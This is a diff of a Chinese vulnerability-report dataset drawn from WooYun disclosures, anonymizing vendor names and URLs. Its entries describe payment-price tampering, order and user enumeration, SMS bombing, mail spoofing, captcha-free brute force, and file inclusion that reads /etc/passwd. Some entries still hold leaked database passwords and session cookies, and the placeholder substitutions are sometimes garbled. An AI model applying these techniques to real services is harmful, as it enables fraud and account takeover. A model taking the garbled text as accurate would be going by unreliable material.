-### [wooyun-2014-055014] QQ文件传输功能存在设计漏洞（可能导致用户执行恶意exe文件）
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-055014] 某互联网公司文件传输功能存在设计漏洞（可能导致用户执行恶意exe文件）
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -17759,8 +17759,8 @@
 ---
 
 ---
-### [wooyun-2013-043240] QQ消息管理器存在设计缺陷（多版本bug）
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-043240] 某互联网公司消息管理器存在设计缺陷（多版本bug）
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -17771,9 +17771,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上一次提交这个漏洞没有通过审核，我这次写详细些。我专门在网上把腾讯QQ的历史版本都找出来了，好辛苦。发现这个问题存在已经有整整一年了啊！【从2012年11月发布的QQ2013 Beta1到现在的最新的QQ2013SP4】我觉得这不能说影响不大。为了说明问题，我在计算机上安装了冰点还原精灵(Deep Freeze)7.51，每次重启计算机后测试一个QQ版本。测试版本：QQ2012 正式版由于QQ2012的消息管理器在删除消息记录时没有【一段时间】这个选项，所以不存在问题。测试版本：QQ2013 Beta1(5459)【2012年11月发布的版本】如图，打开消息管理器，在某个分组上点右键，选删除消息记录在新窗口再选 只删除【一段时间】的消息记录，然后在下方的日历中选时间段。问题出来了：开始时间任意选（只要比截止时间早就行），截止时间选择 1/3/5/7/8/10/12月 的 31日 时，就会出
+**详情**: 上一次提交这个漏洞没有通过审核，我这次写详细些。我专门在网上把某互联网公司某互联网公司的历史版本都找出来了，好辛苦。发现这个问题存在已经有整整一年了啊！【从2012年11月发布的某互联网公司2013 Beta1到现在的最新的某互联网公司2013SP4】我觉得这不能说影响不大。为了说明问题，我在计算机上安装了冰点还原精灵(Deep Freeze)7.51，每次重启计算机后测试一个某互联网公司版本。测试版本：某互联网公司2012 正式版由于某互联网公司2012的消息管理器在删除消息记录时没有【一段时间】这个选项，所以不存在问题。测试版本：某互联网公司2013 Beta1(5459)【2012年11月发布的版本】如图，打开消息管理器，在某个分组上点右键，选删除消息记录在新窗口再选 只删除【一段时间】的消息记录，然后在下方的日历中选时间段。问题出来了：开始时间任意选（只要比截止时间早就行），截止时间选择 1/3/5/7/8/10/12月 的 31日 时，就会出
 
-**POC**: 如图，在QQ2013中，问题一直存在：
+**POC**: 如图，在某互联网公司2013中，问题一直存在：
 
 **绕过**: 直接利用
 
@@ -17793,7 +17793,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.dghui.com/register.actionPOST /smGenerator.action HTTP/1.1x-requested-with: XMLHttpRequestAccept-Language: zh-cnReferer: http://www.dghui.com/register.actionAccept: */*Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)Host: www.dghui.comContent-Length: 52Proxy-Connec
+**详情**: https://example.com/[已脱敏] /smGenerator.action HTTP/1.1x-requested-with: XMLHttpRequestAccept-Language: zh-cnReferer: https://example.com/[已脱敏] */*Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)Host: www.dghui.comContent-Length: 52Proxy-Connec
 
 **POC**: (见原文)
 
@@ -17837,9 +17837,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先下载官方的APP,网址在这,大家可以自行下载http://www.16wifi.com/需要手机注册的,注册后赠送600MB流量,不多,大概就50分钟的高清电视剧的流量,还有约200个金币.赚取金币的方法:阅读文章 2金币/次安装游戏 100金币/次安卓小说或者普通APP 50金币/次所以,我才不会去阅读文章,太少.安装应用在自己手机里也太不好,就想到了在Android X86里来刷金币(虚拟机太烦了,体验也不好)Android X86的文件都有备份,每次系统安装完垃圾直接替换新的文件,省去再次安装的烦恼在刷金币时发现一处漏洞,应该是下载完成,并且安装完成应用之后才会有金币奖励的.但是我发现只需要下载了apk文件完成,就有金币奖励,虽然实在跳转到安装界面时才有奖励,但是我完全可以取消安装,就像下图一样因为是用Android X86来刷的,具体手机怎么样,没试验然后短短20分钟就刷到了1
+**详情**: 首先下载官方的APP,网址在这,大家可以自行下载https://example.com/[已脱敏] 2金币/次安装游戏 100金币/次安卓小说或者普通APP 50金币/次所以,我才不会去阅读文章,太少.安装应用在自己手机里也太不好,就想到了在Android X86里来刷金币(虚拟机太烦了,体验也不好)Android X86的文件都有备份,每次系统安装完垃圾直接替换新的文件,省去再次安装的烦恼在刷金币时发现一处漏洞,应该是下载完成,并且安装完成应用之后才会有金币奖励的.但是我发现只需要下载了apk文件完成,就有金币奖励,虽然实在跳转到安装界面时才有奖励,但是我完全可以取消安装,就像下图一样因为是用Android X86来刷的,具体手机怎么样,没试验然后短短20分钟就刷到了1
 
-**POC**: 首先下载官方的APP,网址在这,大家可以自行下载http://www.16wifi.com/需要手机注册的,注册后赠送600MB流量,不多,大概就50分钟的高清电视剧的流量,还有约200个金币.赚取金币的方法:阅读文章 2金币/次安装游戏 100金币/次安卓小说或者普通APP 50金币/次所以,我才不会去阅读文章,太少.安装应用在自己手机里也太不好,就想到了在Android X86里来刷金币(虚拟机太烦了,体验也不好)Android X86的文件都有备份,每次系统安装完垃圾直接替换新的文件,省去再次安装的烦恼在刷金币时发现一处漏洞,应该是下载完成,并且安装完成应用之后才会有金币奖励的.但是我发
+**POC**: 首先下载官方的APP,网址在这,大家可以自行下载https://example.com/[已脱敏] 2金币/次安装游戏 100金币/次安卓小说或者普通APP 50金币/次所以,我才不会去阅读文章,太少.安装应用在自己手机里也太不好,就想到了在Android X86里来刷金币(虚拟机太烦了,体验也不好)Android X86的文件都有备份,每次系统安装完垃圾直接替换新的文件,省去再次安装的烦恼在刷金币时发现一处漏洞,应该是下载完成,并且安装完成应用之后才会有金币奖励的.但是我发
 
 **绕过**: 直接利用
 
@@ -17883,7 +17883,7 @@
 
 **详情**: 
 
-**POC**: 遨游浏览器在升级时会以GET方式请求四个包其中与升级有关的是/mx3manual/updater_index.htm.php?ver=4.3.0.3000&pn=max4&producttype=zh-cn&mac=000c29a85fd9&lng=zh-cn&update_type=manual&ver_type=stable&t=1411110647也就是说遨游浏览器向服务器请求的是：updatecn.maxthon.com/mx3manual/updater_index.htm.php然后服务器返回一个压缩过的升级配置程序mxup.exe,解压前和解压后：然后浏览器自动执行这个升级程序完
+**POC**: 遨游浏览器在升级时会以GET方式请求四个包其中与升级有关的是/mx3manual/updater_index.htm.php?ver=[IP已脱敏]0&pn=max4&producttype=zh-cn&mac=000c29a85fd9&lng=zh-cn&update_type=manual&ver_type=stable&t=1411110647也就是说遨游浏览器向服务器请求的是：updatecn.maxthon.com/mx3manual/updater_index.htm.php然后服务器返回一个压缩过的升级配置程序mxup.exe,解压前和解压后：然后浏览器自动执行这个升级程序完
 
 **绕过**: 直接利用
 
@@ -17903,7 +17903,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 不好意思，跟你们的官方账号绑定了手机号。带来不便，请多包涵开始说问题http://app.mofang.com/下载APP。每一个注册后的账号，都会默认添加上【魔方宝贝】这一账号作为第一个好友，已获取该账号uid=80001用自己的账号登陆。修改返回体。要修改的接口如下图取消拦截后，即可登陆该账号。可查看消息（内含部分用户的联系地址跟方式）可跟帖评论。查看存号箱等（这账号上没存号，囧）继续说。由于个人资料上有一栏，绑定手机号的功能进入后可给自己手机发短信验证码进行绑定。绑定后的结果就是这样的然后呢就可以去主站啊，重置密码去咯。主站登陆原本以为可以进后台继续深入，结果还是太年起。ending
+**详情**: 不好意思，跟你们的官方账号绑定了手机号。带来不便，请多包涵开始说问题https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -17913,8 +17913,8 @@
 ---
 
 ---
-### [wooyun-2016-0175275] 支付宝绕过安全环境检测记录登录密码/支付密码
-**厂商**: 支付宝 | **年份**: 2016 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2016-0175275] 某电商平台绕过安全环境检测记录登录密码/支付密码
+**厂商**: 某电商平台 | **年份**: 2016 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -18013,7 +18013,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在支付时可以修改订单总价,为了避免不必要的麻烦,未完成支付的最后一步.但是跳转到支付宝价格已被修改。未完全确认，希望厂商自行测试。1.下单2.修改
+**详情**: 在支付时可以修改订单总价,为了避免不必要的麻烦,未完成支付的最后一步.但是跳转到某电商平台价格已被修改。未完全确认，希望厂商自行测试。1.下单2.修改
 
 **POC**: (见原文)
 
@@ -18045,7 +18045,7 @@
 ---
 
 ---
-### [wooyun-2015-0142761] 顺丰旗下“有物”微信购物平台漏洞之查看任意订单
+### [wooyun-2015-0142761] 顺丰旗下“有物”某互联网公司购物平台漏洞之查看任意订单
 **厂商**: 顺丰速运 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
@@ -18057,9 +18057,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 点击一个订单长按，拷贝订单地址，可以看见http://api.daidongxi.com/daidongxi/V2/share/view/orderInfo/00000076***的一个链接，这个链接不能直接在浏览器里打开，要在微信里打开。修改后面的数字，发送到微信的聊天框里，打开，可以看到别人的订单信息，慢慢的遍历，拿到刚刚发货的信息，可以找顺丰客服修改地址的哦。哈哈，就不测试了。没有继续往下挖
+**详情**: 点击一个订单长按，拷贝订单地址，可以看见https://example.com/[已脱敏]
 
-**POC**: http://api.daidongxi.com/daidongxi/V2/share/view/orderInfo/00000076200http://api.daidongxi.com/daidongxi/V2/share/view/orderInfo/00000075500http://api.daidongxi.com/daidongxi/V2/share/view/orderInfo/00000075600http://api.daidongxi.com/daidongxi/V2/share/view/orderInfo/00000076000http://api.daidongxi
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -18123,7 +18123,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这是demo地址http://demo.ourphp.net注册个小号上去随便买一件商品以这件为例 http://demo.ourphp.net/?cn-shoppingcart.html-&ourphp_cms=shopping然后去结算。结算的时候抓包，将ourphp_opcms本来是699的，后面那个改成-100然后最后结算就-100了
+**详情**: 这是demo地址https://example.com/[已脱敏] https://example.com/[已脱敏]
 
 **POC**: 以上
 
@@ -18156,7 +18156,7 @@
 
 ---
 ### [wooyun-2013-034344] 移动139邮箱伪造发信地址
-**厂商**: 中国移动 | **年份**: 2013 | **类型**: 钓鱼欺诈信息
+**厂商**: 某运营商 | **年份**: 2013 | **类型**: 钓鱼欺诈信息
 
 **元思考**: 触发信号: 功能测试
 
@@ -18167,7 +18167,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 通过伪造中国移动139邮箱10086@chinamobile.com系统信箱（当然、可以伪造为省、地方移动信箱比如陕西移动：10086@sn.chinamobile.com）对手机发送Email，系统未做短信提醒限时导致短信轰炸，而且发送的内容可被恶意钓鱼.而且每次的系统发过来手机号不一样，安全类软件显示无法拦截。（上图：伪造中国系统信箱，对手机发送Email）（我网速不太好，就随意的猛戳了4、5下，基本上时间间隔不断的短信过来。自己可以抓包提交等方法实现批量短信轰炸，你们比我高、您们懂得）(上图：为系统发过来过来的短信提醒内容)上面附上一张，我简单试验的钓鱼图，内容怎么利用，大家懂得！！！求乌云哥哥给个邀请码！
+**详情**: 通过伪造某运营商139邮箱10086@chinamobile.com系统信箱（当然、可以伪造为省、地方移动信箱比如陕西移动：10086@sn.chinamobile.com）对手机发送Email，系统未做短信提醒限时导致短信轰炸，而且发送的内容可被恶意钓鱼.而且每次的系统发过来手机号不一样，安全类软件显示无法拦截。（上图：伪造中国系统信箱，对手机发送Email）（我网速不太好，就随意的猛戳了4、5下，基本上时间间隔不断的短信过来。自己可以抓包提交等方法实现批量短信轰炸，你们比我高、您们懂得）(上图：为系统发过来过来的短信提醒内容)上面附上一张，我简单试验的钓鱼图，内容怎么利用，大家懂得！！！求乌云哥哥给个邀请码！
 
 **POC**: ---------------------------------------------------
 
@@ -18189,9 +18189,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 任意文件包含位于：http://edit.buding.cn/cms/enter.php?product=../../../../../../../../../../etc/passwd%00.jpg非root，无法读shadow。首先尝试收集用户名，找到：rootopertransferluozhaoboluoxianlixiaofengrenfeiwangchunpengyangyujllbaojuqiangyuchenhezhengchenbingyumuninzhouweidatabackupgitejbcagaoleiwangdonghekunmingwangjunmartin作为基本思路，收集了用户名列表就可以去破解邮箱了。因为非root权限，而且是“文件包含”漏洞，所以读php文件中的配置是存在一些困难的。我逐个用户测试能否读.bash_history文件。功夫不负有心人呐，
+**详情**: 任意文件包含位于：https://example.com/[已脱敏]
 
-**POC**: MySQL数据库：host = '58.68.234.22', user = 'yangyu', passwd = 'netjava', db = 'martin', charset = 'utf8'host = '118.192.93.138', port = 3308, db = 'martin',user = 'yangyu', passwd = 'netjava', charset = 'utf8'    可远程连接host = '223.202.2.206',user = 'yangyu', passwd = 'netjava', db = 'vcar_sumrise', chars
+**POC**: MySQL数据库：host = '[IP已脱敏]', user = 'yangyu', passwd = 'netjava', db = 'martin', charset = 'utf8'host = '[IP已脱敏]', port = 3308, db = 'martin',user = 'yangyu', passwd = 'netjava', charset = 'utf8'    可远程连接host = '[IP已脱敏]',user = 'yangyu', passwd = 'netjava', db = 'vcar_sumrise', chars
 
 **绕过**: 直接利用
 
@@ -18255,18 +18255,18 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 最新版。在url上输入：http://suggestion.baidu.com/su;/1.bat?wd=&cb=calc||&sid=1440_2031_1945_1788&t=1362056239875成功执行代码相通情况下，QQ浏览器已经对这串url不解析了：
+**详情**: 最新版。在url上输入：https://example.com/[已脱敏]
 
 **POC**: 成功执行代码
 
 **绕过**: 直接利用
 
-**修复**: 参考：http://drops.wooyun.org/papers/3771
+**修复**: 参考：https://example.com/[已脱敏]
 ---
 
 ---
 ### [wooyun-2015-0123016] 电信某重要站点逻辑缺陷可批量修改用户信息
-**厂商**: 中国电信 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口
 
@@ -18299,9 +18299,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中关村在线用户注册时，需要向注册用户邮箱发送含有加密字符串的激活链接进行激活，如http://service.zol.com.cn/user/register_email_ok.php?uid=***&email=**@123.com&code=9c7aef28a6e7742cb1157a4d2f0b7375, 但加密字符串在”重新发送邮件“功能处泄露，如图:导致可以猜到code处的 参数，直接拼接url http://service.zol.com.cn/user/register_email_ok.php?uid=***&email=***@123.com&code=5addd7dec4e1a4df6c0efc6441e5c41c 进行激活。邮件验证形同虚设，导致恶意灌水注册。
+**详情**: 中关村在线用户注册时，需要向注册用户邮箱发送含有加密字符串的激活链接进行激活，如https://example.com/[已脱敏] 但加密字符串在”重新发送邮件“功能处泄露，如图:导致可以猜到code处的 参数，直接拼接url https://example.com/[已脱敏] 进行激活。邮件验证形同虚设，导致恶意灌水注册。
 
-**POC**: 注册新用户，邮箱随便填写，提交。点击查看 源代码，找”再次发送注册邮件链接“取出code参数，拼接链接(uid为注册名称)http://service.zol.com.cn/user/register_email_ok.php?uid=***&email=***@123.com&code=5addd7dec4e1a4df6c0efc6441e5c41c 并访问，提示激活成功。
+**POC**: 注册新用户，邮箱随便填写，提交。点击查看 源代码，找”再次发送注册邮件链接“取出code参数，拼接链接(uid为注册名称)https://example.com/[已脱敏] 并访问，提示激活成功。
 
 **绕过**: 直接利用
 
@@ -18321,7 +18321,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 一分钱充1千万，感觉摊上事了...263云通信，在线充值：http://www.263.net/263/onlineTopUp/提交，然后点“充值遇到问题”，这个时候订单已经生成了。Firebug抓包获取到中间有个url如下:http://paycenter.263.net/pay/payway_payGetWay.action?serviceUserCode=263qytxvboss&key=5c59aaa1e2532fdf2db725e80e1fa742&productCode=vbossP&payMoney=0.01&orderId=1000055070&buyer=test@domain.com&ejd=994c63e1d017331ebb0a81ca51cbcd93直接修改payMoney的值，回车：发现订单的金额已经变成0.01了。然后下一步，支付成功：我想啊，支付了0.01，
+**详情**: 一分钱充1千万，感觉摊上事了...263云通信，在线充值：https://example.com/[已脱敏]
 
 **POC**: 很抱歉，测试的时候分别用1毛钱和1分钱充了两个100的订单。暂时没有消费，请撤回吧，拿着手抖~~
 
@@ -18343,7 +18343,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 云农场1 手机验证码在返回包中2 POST请求直接改密http://www.ync365.com首先我用自己手机号注册了一个用户，然后可以登录，之后我就退出账户，找回密码。在首页“登录”下点“忘记密码”，然后到了找回密码链接中：http://www.ync365.com/resetPassword.php?act=default&type=users输入手机号18700000000，点击发送验证码，这里手机号不存在抓取数据包，一个GET请求验证手机号是否存在：GET /resetPassword.php?val=18700000000&type=0&act=checkPhone HTTP/1.1Host: www.ync365.com返回的是：no然后我输入自己的手机号187********，发送验证码，先有一个验证手机是否存在的数据包，这个返回的是：yes这个可以用来证明一个手机号是否存
+**详情**: 云农场1 手机验证码在返回包中2 POST请求直接改密https://example.com/[已脱敏] /resetPassword.php?val=18700000000&type=0&act=checkPhone HTTP/1.1Host: www.ync365.com返回的是：no然后我输入自己的手机号187********，发送验证码，先有一个验证手机是否存在的数据包，这个返回的是：yes这个可以用来证明一个手机号是否存
 
 **POC**: 改密成功，可以登录。
 
@@ -18453,7 +18453,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 新网主站登录设计逻辑缺陷，去年解析域名的时候发现的问题。。。。http://www.xinnet.com/account/account.do?method=index两处登录框，可无视验证码进行暴力破解；1、账号规则固定，允许自定义账号登录和hy1XXXXX的系统固定格式id进行登录；2、虽然用户登录模块有验证码，但是主页右上角的登陆框，可无视验证码；3、使用主页右上角登录框进行登录，抓包；4、使用repeater功能进行反复提交分析，发现如果带有cookie，则无论如何提交账号，都返回空，这里如果无法直接进行批量爆破；5、反复分析后，删除cookie后，正常提交，服务器返回正常账号状态，则手工删除cookie使用hy1XXXXX格式的id，可组合12345678、admin123、password等弱口令进行批量猜测账号；6、配置猜测范围和提取页面返回错误的特征，准备进行批量；8、分分
+**详情**: 新网主站登录设计逻辑缺陷，去年解析域名的时候发现的问题。。。。https://example.com/[已脱敏]
 
 **POC**: 8、分分钟就出现弱口令了....口令正确，页面返回当前用户名；9、估计弱口令的都是小号，有业务的账号，不可能用12345678，不过你也可以换字典再批量跑...
 
@@ -18563,7 +18563,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 选一本书一路下订单付款方式选择在线支付下订单成功点击 选择支付方式 支付宝  burp截断get请求中 价格以明文形式 提交，这里 可以任意改价格额，可惜0.00不可以 只好浪费0.01元了价格变成0.01成功支付！！！
+**详情**: 选一本书一路下订单付款方式选择在线支付下订单成功点击 选择支付方式 某电商平台  burp截断get请求中 价格以明文形式 提交，这里 可以任意改价格额，可惜0.00不可以 只好浪费0.01元了价格变成0.01成功支付！！！
 
 **POC**: (见原文)
 
@@ -18607,7 +18607,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 注册处存在逻辑错误，可遍历所有注册用户的登录账号http://www.m6go.com/user/regSuc.do?UserID=734188点击注册注册成功后会提示，发现URL中存在UserId更改UserId值即可遍历所有用户登录账号
+**详情**: 注册处存在逻辑错误，可遍历所有注册用户的登录账号https://example.com/[已脱敏]
 
 **POC**: 已经绑定邮箱的还可泄露邮箱信息利用危害，可以通过弱口令去登录其他账号，还得通过邮箱，手机号等登录信息去社工。。有一定的危害，这里说明问题，不深入测试
 
@@ -18639,8 +18639,8 @@
 ---
 
 ---
-### [wooyun-2013-038385] 新浪看游戏客户端DLL劫持漏洞
-**厂商**: 新浪 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-038385] 某社交平台看游戏客户端DLL劫持漏洞
+**厂商**: 某社交平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -18684,7 +18684,7 @@
 
 ---
 ### [wooyun-2012-04689] 移动短信轰炸
-**厂商**: 中国移动 | **年份**: 2012 | **类型**: 网络设计缺陷/逻辑错误
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: 网络设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -18695,9 +18695,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.zj.monternet.com/portal/web/GetMesPwdIndexAction.do?  老话长谈了，没啥好说的。
+**详情**: https://example.com/[已脱敏]  老话长谈了，没啥好说的。
 
-**POC**: http://www.zj.monternet.com/portal/web/GetMesPwdIndexAction.do?
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -18705,8 +18705,8 @@
 ---
 
 ---
-### [wooyun-2014-051413] 京东咚咚可构造特殊信息
-**厂商**: 京东商城 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-051413] 某电商平台咚咚可构造特殊信息
+**厂商**: 某电商平台商城 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -18717,7 +18717,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在处理URL的时候，京东咚咚的判断是 （我用正则体现）www\..*? 就为网址，然后进行url特殊处理，使之可以直接点击打开。然后我们就可以利用这一特性，再加上对待传输文件的特殊信息，构造。
+**详情**: 在处理URL的时候，某电商平台咚咚的判断是 （我用正则体现）www\..*? 就为网址，然后进行url特殊处理，使之可以直接点击打开。然后我们就可以利用这一特性，再加上对待传输文件的特殊信息，构造。
 
 **POC**: (见原文)
 
@@ -18750,7 +18750,7 @@
 
 ---
 ### [wooyun-2013-044836] 安卓版微云客户端绕过独立密码
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -18783,13 +18783,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 页面http://www.tudou.com/my/setting/notifyMe.action里的一个【以上消息可用下面方法提醒我】form正常状态下很多消息提醒都被选中：（用户可以选择发送频率、需要提醒的邮箱）正常状态这个form请求的一个sample如下：GET http://message.tudou.com/updateEmailSetting.html?callback=jQuery16405471757907992225_1375018012075&isSend=1&frequency=14&email=XXX%40email.com&_=1375018012464 HTTP/1.1Accept: */*Referer: http://www.tudou.com/my/setting/notifyMe.actionAccept-Language: zh-cnUser-Age
+**详情**: 页面https://example.com/[已脱敏] https://example.com/[已脱敏] HTTP/1.1Accept: */*Referer: https://example.com/[已脱敏] zh-cnUser-Age
 
-**POC**: 结合上述第2点和表单input，制造attack.html（email参数里写黑客控制的参数），放到wordpress上，或者黑客自己的网站（类似squarefree.com）然后将这样的地址放到微博上传播，一旦土豆用户点击打开attack.html（登录状态下），就会有如下邮件发到黑客邮箱。然后，黑客在不登录土豆的状态下点击这个email，也会提醒你绑定邮箱成功（所以更严重的漏洞可能是这边），虽然会再跳到登录页面（http://login.tudou.com/login.do?noreg=ok&service=http://www.tudou.com/my/tui/got/）。3秒跳转，来不
+**POC**: 结合上述第2点和表单input，制造attack.html（email参数里写黑客控制的参数），放到wordpress上，或者黑客自己的网站（类似squarefree.com）然后将这样的地址放到某社交平台上传播，一旦土豆用户点击打开attack.html（登录状态下），就会有如下邮件发到黑客邮箱。然后，黑客在不登录土豆的状态下点击这个email，也会提醒你绑定邮箱成功（所以更严重的漏洞可能是这边），虽然会再跳到登录页面（https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 1. CSRF防御那边你们更清楚（比如限制refer只能是http://www.tudou.com/my/setting/notifyMe.action）。。。具体哪个没做好，请告诉我一声。2. 提醒邮箱绑定认证那边，需要在用户登录情况下才生效http://message.tudou.com/che
+**修复**: 1. CSRF防御那边你们更清楚（比如限制refer只能是https://example.com/[已脱敏] 提醒邮箱绑定认证那边，需要在用户登录情况下才生效https://example.com/[已脱敏]
 ---
 
 ---
@@ -18805,7 +18805,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.存在漏洞的是主站哦http://www.suning.com/emall/city_10052_10051_9264_.html2.支付漏洞，模拟下如何使用1元钱买ipad的吧，下面这张图选择一键购
+**详情**: 1.存在漏洞的是主站哦https://example.com/[已脱敏]
 
 **POC**: 3.填写好想要信息之后，进入到付款页面，注意看金额，这里是原价2866.00元4.下面是重点了，提交订单，在跳转到银行支付的页面时，抓包，将金额改成￥1.005.具体的参数信息如下，Amount肯定就是金额了BranchID=0025&CoNo=004624&BillNo=0023258647&Amount=2866.00&Date=20120804&MerchantUrl=https%3A%2F%2Fcallback.suning.com%2FNetPayment%2Fcallback%2FpageCallBack.action&MerchantPara=232586476.转到银行支付页面
 
@@ -18859,8 +18859,8 @@
 ---
 
 ---
-### [wooyun-2016-0191283] 任意具有某服务权限的安卓应用都能轻松截获支付宝支付密码
-**厂商**: 支付宝 | **年份**: 2016 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2016-0191283] 任意具有某服务权限的安卓应用都能轻松截获某电商平台支付密码
+**厂商**: 某电商平台 | **年份**: 2016 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -18871,13 +18871,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 支付宝的安全键盘上没有做好对于accessibility service一定的防护，任意的具有accessibility service权限，并在设置中的无障碍开启的应用比如微信抢红包插件都有可能成为窃取支付宝支付密码的工具安卓软件有一个功能叫做无障碍，本来是用于给一些残障人士使用的，比如talkback应用给一些视力不好的人士使用，在开启后，当手指触碰到某个view的时候，系统会把这个view的内容读出来给你。春节的时候，流行各种的微信抢红包插件就是利用了这个aceessibility service来实现获取屏幕上的信息以及自动抢红包。虽然这个功能是用户自己开启的，而且开启的时候，提醒用户可嫩会读取信用卡信息。但是作为一个涉及到财产安全的app，还是要对这个功能做一层防护的。在这方面，微信和掌上生活都做得很好，对于aceessibility service做了一定的防护。然而作为一个大
+**详情**: 某电商平台的安全键盘上没有做好对于accessibility service一定的防护，任意的具有accessibility service权限，并在设置中的无障碍开启的应用比如某互联网公司抢红包插件都有可能成为窃取某电商平台支付密码的工具安卓软件有一个功能叫做无障碍，本来是用于给一些残障人士使用的，比如talkback应用给一些视力不好的人士使用，在开启后，当手指触碰到某个view的时候，系统会把这个view的内容读出来给你。春节的时候，流行各种的某互联网公司抢红包插件就是利用了这个aceessibility service来实现获取屏幕上的信息以及自动抢红包。虽然这个功能是用户自己开启的，而且开启的时候，提醒用户可嫩会读取信用卡信息。但是作为一个涉及到财产安全的app，还是要对这个功能做一层防护的。在这方面，某互联网公司和掌上生活都做得很好，对于aceessibility service做了一定的防护。然而作为一个大
 
 **POC**: 现在只是在logcat里面打印出来密码，完全可以做到收集到密码后上传到服务器。甚至是自己空视频地址：http://**.**.**.**/v_show/id_XMTUxOTA1NzM4OA==.html
 
 **绕过**: 直接利用
 
-**修复**: 可参考微信的防护措施，设立一个安全键盘，安全键盘的每一个键都设置一个自定义的accessibility delegate ,这样的话，支付密码就不会被任意有accessibility 权限的应用监听到
+**修复**: 可参考某互联网公司的防护措施，设立一个安全键盘，安全键盘的每一个键都设置一个自定义的accessibility delegate ,这样的话，支付密码就不会被任意有accessibility 权限的应用监听到
 ---
 
 ---
@@ -18947,8 +18947,8 @@
 ---
 
 ---
-### [wooyun-2015-0148449] 饿了么某系统逻辑漏洞可导致用户敏感信息泄漏
-**厂商**: 饿了么 | **年份**: 2015 | **类型**: 重要敏感信息泄露
+### [wooyun-2015-0148449] 某外卖平台某系统逻辑漏洞可导致用户敏感信息泄漏
+**厂商**: 某外卖平台 | **年份**: 2015 | **类型**: 重要敏感信息泄露
 
 **元思考**: 触发信号: 功能测试
 
@@ -18959,7 +18959,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题出在有菜 微信端首先我们看下商户信息然后抓包GET /api/supplier/2792 HTTP/1.1Host: youcai.ele.meAccept-Encoding: gzip, deflateCookie: _utrace=c8456e60386614d292486c081b713c10_2015-10-13; eleme__ele_me=f5392406e563495e23b77fefe7e2d099%3A7deebd27579661558aa60ff03882f47a47b5733a; track_id=1444666918%7Ccd7c60baeac69b4cfd36667853b4efd0990137340c68e6f9f0%7C4621431fe41c60df1fb5c396d1ea5f7b; ubt_ssid=yz8zt80frn2fw1epek29ymoq3g
